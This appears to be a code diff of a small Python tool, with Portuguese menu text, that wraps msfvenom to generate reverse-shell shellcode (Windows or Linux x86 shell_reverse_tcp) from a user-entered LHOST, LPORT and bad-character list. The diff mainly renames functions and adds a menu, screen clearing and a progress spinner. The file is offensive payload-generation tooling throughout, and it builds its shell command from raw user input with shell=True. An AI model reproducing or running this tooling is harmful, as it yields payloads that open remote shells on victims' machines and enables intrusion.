@@ -1,43 +1,63 @@
 import subprocess
+import time
+import os
 
-def criar_payload(tipo_payload, lhost, lport, badchars):
-    comando = f"msfvenom -p {tipo_payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f c -b \"{badchars}\""
-    processo = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    output, error = processo.communicate()
+def create_shellcode(lhost, lport, badchar, payload):
+    command = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -b "{badchar}" -f c'
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output, error = process.communicate()
 
-    if error:
-        print(f"Ocorreu um erro: {error.decode('utf-8')}")
+    if process.returncode == 0:
+        return output.decode('utf-8')
     else:
-        print(f"\nPayload gerado:\n{output.decode('utf-8')}")
-        print("\nShellcode:")
-        shellcode = extrair_shellcode(output.decode('utf-8'))
-        print(shellcode)
+        return error.decode('utf-8')
 
-def extrair_shellcode(output):
-    linhas = output.split("\n")
-    for linha in linhas:
-        if linha.startswith("unsigned char"):
-            return linha.split(" = ")[1].strip(";")
-
-def main():
-    print("Selecione o tipo de payload:")
+def print_menu():
+    print("*" * 40)
+    print("   Bem-vindo ao Criador de Shellcode")
+    print("*" * 40)
+    print("Escolha um payload:")
     print("1. windows/shell_reverse_tcp")
     print("2. linux/x86/shell_reverse_tcp")
-    tipo_payload = input("Opção: ")
+    print("*" * 40)
 
-    lhost = input("Digite o LHOST: ")
-    lport = input("Digite o LPORT: ")
-    badchars = input("Digite os badchars (no formato '\\x00\\x12\\x34...'): ")
-
-    if tipo_payload == "1":
-        tipo_payload = "windows/shell_reverse_tcp"
-    elif tipo_payload == "2":
-        tipo_payload = "linux/x86/shell_reverse_tcp"
+def clear_screen():
+    if os.name == 'nt':
+        os.system('cls')
     else:
-        print("Opção inválida.")
+        os.system('clear')
+
+def main():
+    clear_screen()
+    print_menu()
+    choice = input("Digite o número correspondente ao payload: ")
+
+    if choice == '1':
+        payload = 'windows/shell_reverse_tcp'
+    elif choice == '2':
+        payload = 'linux/x86/shell_reverse_tcp'
+    else:
+        print("Escolha inválida.")
         return
 
-    criar_payload(tipo_payload, lhost, lport, badchars)
+    lhost = input("Digite o valor para LHOST: ")
+    lport = input("Digite o valor para LPORT: ")
+    badchar = input("Digite o valor para Badchar: ")
 
-if __name__ == "__main__":
+    clear_screen()
+    print("Criando payload...")
+    for _ in range(10):
+        time.sleep(0.1)
+        print("\b/", end="")
+        time.sleep(0.1)
+        print("\b-", end="")
+    print("\n")
+
+    shellcode = create_shellcode(lhost, lport, badchar, payload)
+
+    clear_screen()
+    print("Shellcode criado:")
+    print(shellcode)
+
+if __name__ == '__main__':
     main()
